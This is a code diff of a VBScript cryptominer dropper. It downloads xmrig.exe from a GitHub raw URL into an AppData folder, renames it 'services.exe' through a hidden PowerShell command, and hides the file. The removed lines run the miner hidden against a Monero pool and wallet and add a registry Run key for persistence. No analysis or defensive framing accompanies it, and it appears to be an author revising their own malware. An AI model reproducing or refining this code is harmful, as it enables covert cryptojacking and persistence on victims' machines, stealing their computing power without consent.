@@ -12,10 +12,7 @@ wallet = "48bBiT9hcQqJBZCXxKi6mSTzatRSN7kLMgjTBSQReTN8K7uCzxpn7ZuH7DUXua5uVLj4rR
 pool = "gulf.moneroocean.stream:10128"
 downloadUrl = "https://raw.githubusercontent.com/followtheyellowbrickroad321/miner-files/main/xmrig.exe"
 
-' --- CHANGES MADE HERE ---
-' Location: LocalAppData (Hidden System Folder)
-' Folder Name: \services
-minerFolder = wsh.SpecialFolders("LocalAppData") & "\services"
+minerFolder = wsh.SpecialFolders("AppData") & "\miner"
 minerName = "services.exe"
 
 ' 1. Create Folder
@@ -33,16 +30,6 @@ psCommand = "powershell -WindowStyle Hidden -Command Rename-Item '" & minerFolde
 wsh.Run psCommand, 0, True
 WScript.Sleep 1000
 
-' 4. Hide File
-fso.GetFile(minerFolder & "\" & minerName).Attributes = 2
-
-' 5. Run Miner (Hidden)
-wsh.Run """" & minerFolder & "\" & minerName & """ -o " & pool & " -u " & wallet & " --cpu-priority 1 --threads=2", 0, False
-
-' --- PERSISTENCE (Registry Startup) ---
-strScriptPath = WScript.ScriptFullName
-wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\XMRigMiner", "wscript.exe """ & strScriptPath & """"
-' --- END OF CODE ---
 ' 4. Hide File
 fso.GetFile(minerFolder & "\" & minerName).Attributes = 2
 
